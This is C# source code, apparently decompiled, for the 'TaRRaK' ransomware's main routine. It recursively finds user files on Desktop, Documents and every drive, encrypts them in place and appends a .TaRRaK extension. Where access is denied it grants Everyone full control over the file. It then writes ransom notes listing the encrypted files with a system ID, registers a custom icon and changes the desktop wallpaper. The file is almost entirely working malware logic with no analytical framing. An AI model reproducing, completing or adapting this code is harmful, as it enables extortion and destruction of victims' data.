using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;
using TaRRaK.Properties;

namespace PPK.NET;

public class Role
{
	private readonly string m_Initializer;

	private readonly string m_Parser;

	private readonly string mock;

	private readonly string _Bridge;

	private readonly string m_Process;

	private readonly string[] _Request;

	private readonly Collection m_Exception;

	private readonly List<string> _Repository;

	public Role()
	{
		Class.SetupThread();
		m_Initializer = "Note fom TaRRaK.txt";
		m_Parser = "Encrypted Files by TaRRaK.txt";
		mock = "TaRRaK.ico";
		_Bridge = "TaRRaK.bmp";
		m_Process = ".TaRRaK";
		_Repository = new List<string>();
		base._002Ector();
		_Request = Resources.extensions.Split(new string[2] { "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
		m_Exception = new Collection(m_Process.Replace(".", string.Empty));
	}

	public void SearchCollection()
	{
		foreach (string item in RateCollection())
		{
			FillCollection(item);
		}
		AssetCollection();
		CollectCollection();
		ConcatCollection();
	}

	private IEnumerable<string> RateCollection()
	{
		List<string> list = new List<string>();
		list.AddRange(PostCollection());
		list.AddRange(from drive in DriveInfo.GetDrives()
			select drive.Name);
		return list;
	}

	private IEnumerable<string> PostCollection()
	{
		return new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal)
		};
	}

	private void FillCollection(string item)
	{
		try
		{
			string[] files = Directory.GetFiles(item);
			foreach (string text in files)
			{
				_003C_003Ec__DisplayClass12_0 CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass12_0();
				CS_0024_003C_003E8__locals0._Info = Path.GetExtension(text);
				if (_Request.Any((string x) => string.Equals(x, CS_0024_003C_003E8__locals0._Info, StringComparison.OrdinalIgnoreCase)))
				{
					CheckCollection(text);
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files = Directory.GetDirectories(item);
			foreach (string text2 in files)
			{
				if (!text2.Contains("All Users\\Microsoft\\") && !text2.Contains("$Recycle.Bin") && !text2.Contains(":\\Windows") && !text2.Contains("\\Program Files") && !text2.Contains("Temporary Internet Files") && !text2.Contains("\\Local\\Microsoft\\") && !text2.Contains(":\\ProgramData\\"))
				{
					FillCollection(text2);
				}
			}
		}
		catch
		{
		}
	}

	private void CheckCollection(string item)
	{
		if (!File.Exists(item))
		{
			return;
		}
		string fileName = Path.GetFileName(item);
		if (fileName == m_Initializer || fileName == m_Parser || fileName == mock || fileName == mock)
		{
			return;
		}
		byte[] array = new byte[0];
		int num = 0;
		while (num < 1)
		{
			try
			{
				array = File.ReadAllBytes(item);
				array = m_Exception.OrderCollection(array);
				num++;
				_Repository.Add(item);
			}
			catch
			{
				try
				{
					FileAttributes attributes = File.GetAttributes(item);
					if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
					{
						attributes &= ~FileAttributes.ReadOnly;
						File.SetAttributes(item, attributes);
					}
					DirectoryInfo directoryInfo = new DirectoryInfo(item);
					DirectorySecurity accessControl = directoryInfo.GetAccessControl();
					accessControl.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
					directoryInfo.SetAccessControl(accessControl);
				}
				catch
				{
				}
			}
		}
		try
		{
			File.WriteAllBytes(item, array);
			File.Move(item, item + m_Process);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int end_param, int visitor_end, string role, int nextcust2);

	private void ConcatCollection()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), _Bridge);
			((Image)Resources.wallpaper).Save(text, ImageFormat.get_Bmp());
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey!.SetValue("WallpaperStyle", "1");
			registryKey!.SetValue("TileWallpaper", "0");
			SystemParametersInfo(20, 0, text, 3);
		}
		catch
		{
		}
	}

	private void CollectCollection()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), mock);
			using MemoryStream memoryStream = new MemoryStream();
			Resources.tarrak.Save((Stream)memoryStream);
			File.WriteAllBytes(text, memoryStream.ToArray());
			Registry.ClassesRoot.CreateSubKey(m_Process + "\\DefaultIcon", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue(string.Empty, text);
		}
		catch
		{
		}
	}

	private void AssetCollection()
	{
		if (_Repository.Count == 0)
		{
			return;
		}
		try
		{
			string text = Resources.Note_fom_TaRRaK.Replace("#FILECOUNT#", _Repository.Count.ToString()).Replace("#SYSTEMID#", Convert.ToBase64String(Collection.byte_0));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(text);
			stringBuilder.AppendLine();
			stringBuilder.AppendLine("Encrypted file(s) list:");
			foreach (string item in _Repository)
			{
				stringBuilder.AppendLine(item);
			}
			string contents = stringBuilder.ToString();
			foreach (string item2 in RateCollection())
			{
				try
				{
					File.WriteAllText(Path.Combine(item2, m_Initializer), text);
					File.WriteAllText(Path.Combine(item2, m_Parser), contents);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
